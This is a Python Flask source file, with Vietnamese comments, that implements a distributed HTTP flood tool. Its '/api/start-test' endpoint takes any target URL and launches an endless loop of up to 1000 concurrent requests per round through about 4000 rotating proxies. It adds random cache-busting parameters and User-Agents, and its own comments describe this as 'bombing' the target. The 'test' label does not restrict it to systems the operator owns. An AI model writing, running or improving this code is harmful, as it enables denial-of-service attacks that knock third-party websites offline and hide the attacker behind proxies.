from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import aiohttp
import threading
import random
import string
import os

app = Flask(__name__)
CORS(app)

# Đọc danh sách 4000 proxy từ file
PROXY_LIST = []
if os.path.exists('proxies.txt'):
    with open('proxies.txt', 'r') as f:
        # Thêm tiền tố http:// vào mỗi dòng proxy để aiohttp hiểu được
        PROXY_LIST = [f"http://{line.strip()}" for line in f if line.strip()]
    print(f"✅ Đã tải thành công {len(PROXY_LIST)} proxies từ file!")
else:
    print("⚠️  Không tìm thấy file proxies.txt. Vui lòng tạo file này!")

async def send_request(session, base_url):
    try:
        # Kỹ thuật Cache Busting
        rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        separator = "&" if "?" in base_url else "?"
        url = f"{base_url}{separator}q={rand_str}"
        
        headers = {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) / Test-{rand_str}',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        }
        
        # Chọn ngẫu nhiên 1 proxy trong 4000 proxy để bắn
        proxy_url = random.choice(PROXY_LIST) if PROXY_LIST else None
        
        # Thêm ssl=False để tránh lỗi khi proxy không có chứng chỉ SSL
        async with session.get(url, headers=headers, proxy=proxy_url, ssl=False, timeout=10) as response:
            return response.status
    except Exception:
        # Bỏ qua các proxy chết để không làm chậm tiến trình
        return None

async def run_attack_loop(url, threads):
    print(f"\n[🔥] Bắt đầu dội bom {url} với {threads} luồng qua {len(PROXY_LIST)} Proxies...")
    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        loop_count = 0
        while True: 
            tasks = [send_request(session, url) for _ in range(threads)]
            await asyncio.gather(*tasks)
            
            loop_count += 1
            if loop_count % 3 == 0: 
                print(f"[+] Hệ thống đang duy trì áp lực phân tán qua mạng Proxy...")
            await asyncio.sleep(0.1)

def background_worker(url, threads):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack_loop(url, threads))
    loop.close()

@app.route('/api/start-test', methods=['POST'])
def start_test():
    data = request.json
    target_url = data.get('url')
    # Ép số luồng cực cao (ví dụ 1000) để tận dụng hết 4000 proxy
    thread_count = int(data.get('threads', 1000))

    thread = threading.Thread(target=background_worker, args=(target_url, thread_count))
    thread.start()

    return jsonify({
        "status": "success", 
        "message": f"✅ Đã kích hoạt kịch bản tải phân tán! Đang sử dụng {len(PROXY_LIST)} proxies dội vào mục tiêu."
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)